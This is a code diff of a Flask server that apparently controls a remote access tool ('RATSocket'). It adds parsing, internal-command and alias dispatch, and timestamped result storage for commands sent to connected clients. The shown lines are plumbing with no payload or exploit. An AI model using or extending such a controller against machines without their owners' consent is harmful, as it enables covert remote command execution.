@@ -9,10 +9,11 @@ from flask_cors import CORS
 from werkzeug.utils import secure_filename
 
 from common.ratsocket import RATSocket
-from common.util import get_write_stream
+from common.util import get_write_stream, parse
 from common.util import logger
 from server.client import Client
 from server.config import SOCKET_ADDR, PASSWORD
+from server.util import internal_commands, Alias
 from server.web_util import *
 
 
@@ -76,7 +77,9 @@ def recv(conn):
                 except Exception as e:
                     result = 0, str(e)
             if result:
-                conn.result[result_id] = result
+                if result_id in conn.result.keys():
+                    conn.result[result_id]['result'] = result
+                    conn.result[result_id]['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
         except socket.error:
             logger.error(f'Connection closed: {conn.address}')
             if conn.id in server.connections:
@@ -112,9 +115,29 @@ def execute():
                 'status': 0,
                 'result': 'Connection does not exist'
             })
-        command_id = conn.send_command(command)
+        cmd_name, cmd_arg = parse(command)
+        if cmd_name in internal_commands:
+            command_id, result = internal_commands[cmd_name](cmd_arg, conn)
+            if not command_id:
+                return jsonify({
+                    'status': result[0],
+                    'result': result[1],
+                    'cwd': conn.info['cwd']
+                })
+        elif cmd_name in Alias.list:
+            command_id, result = Alias.send(conn, command)
+            if not command_id:
+                return jsonify({
+                    'status': result[0],
+                    'result': result[1],
+                    'cwd': conn.info['cwd']
+                })
+        else:
+            command_id = conn.send_command(command)
+        if command_id:
+            conn.result[command_id] = {'command': command}
         while 1:
-            result = conn.result.get(command_id)
+            result = conn.result[command_id].get('result')
             if result:
                 filename = None
                 if len(result) == 3:
